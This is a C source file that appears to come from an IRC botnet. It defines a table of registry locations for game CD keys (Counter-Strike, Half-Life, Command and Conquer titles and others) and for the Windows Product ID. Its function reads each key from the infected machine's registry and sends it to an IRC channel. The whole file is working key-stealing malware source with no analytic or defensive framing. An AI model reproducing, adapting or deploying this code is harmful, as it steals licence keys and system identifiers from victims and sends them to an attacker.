#include "includes.h"
#include "functions.h"
#include "extern.h"

#ifndef NO_CDKEYS

//globals
REGKEYS regkeys[]={
	{HKEY_CURRENT_USER,"Software\\Valve\\CounterStrike\\Settings","CDKey","Counter-Strike (Retail)",NULL,NULL},
	{HKEY_CURRENT_USER,"Software\\Valve\\Gunman\\Settings","Key","Gunman Chronicles",NULL,NULL},
	{HKEY_CURRENT_USER,"Software\\Valve\\Half-Life\\Settings","Key","Half-Life",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion","ProductId","Microsoft Windows Product ID",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\IGI 2 Retail","CDKey","IGI 2: Covert Strike",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Tiberian Sun","Serial","Command and Conquer: Tiberian Sun",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert","Serial","Command and Conquer: Red Alert",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert 2","Serial","Command and Conquer: Red Alert 2",NULL,NULL},	
	{NULL,NULL,NULL,NULL,NULL,NULL}
};

void getcdkeys(SOCKET sock, char *chan, BOOL notice)
{
	char sendbuf[IRCLINE], line[100], szPath[MAX_PATH];
	unsigned char szDataBuf[128]; 

	FILE *fp;
	HKEY hkey;
	LONG lRet;
	DWORD dwSize = 128;

	for (unsigned int i=0; regkeys[i].subkey; i++) {
		lRet = fRegOpenKeyEx(regkeys[i].hkey, regkeys[i].subkey, 0, KEY_READ, &hkey);
		if(fRegQueryValueEx(hkey, regkeys[i].value, NULL, NULL, szDataBuf, &dwSize) == ERROR_SUCCESS) {
			if (regkeys[i].file) {
				sprintf(szPath, "%s\\%s", szDataBuf, regkeys[i].file);
				if((fp=fopen(szPath,"r"))!=NULL) { 
					while(fgets(line,sizeof(line),fp)) {
						if(!strstr(line, regkeys[i].tag)) {
							if (strchr(regkeys[i].tag,'=')) {
								strtok(line,"=");
								sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,strtok(NULL, "="));
							} else 
								sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,line);
							irc_privmsg(sock,chan,sendbuf,notice);
							addlog(sendbuf);
							break;
						}
					}
					fclose(fp); 
				}
			} else {
				sprintf(sendbuf, "%s CD Key: (%s).",regkeys[i].name,szDataBuf);
				irc_privmsg(sock,chan,sendbuf,notice);
				addlog(sendbuf);
			}
		}
		fRegCloseKey(hkey);
	}
  
	return;
}
#endif
